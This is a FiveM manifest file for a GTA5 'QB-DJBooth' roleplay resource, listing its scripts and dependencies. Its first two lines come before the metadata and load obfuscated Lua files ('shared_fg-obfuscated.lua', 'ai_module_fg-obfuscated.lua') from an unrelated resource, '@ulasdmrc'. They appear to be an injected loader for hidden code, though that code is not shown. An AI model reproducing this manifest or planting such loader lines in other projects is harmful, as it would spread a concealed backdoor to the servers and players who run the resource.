shared_script '@ulasdmrc/shared_fg-obfuscated.lua'
shared_script '@ulasdmrc/ai_module_fg-obfuscated.lua'
name "QB-DJBooth"
author "Jimathy"
version "v1.1"
description 'QB-DJBooth Edit By Jimathy'
fx_version "cerulean"
game "gta5"
client_scripts {
    '@PolyZone/client.lua',
    '@PolyZone/BoxZone.lua',
    '@PolyZone/EntityZone.lua',
    '@PolyZone/CircleZone.lua',
    '@PolyZone/ComboZone.lua',
    'client.lua',
    'locales/*.lua'
}
shared_script { 'config.lua', 'locales/*.lua' }
server_script { 'server.lua' }
dependency 'xsound'
lua54 'yes'
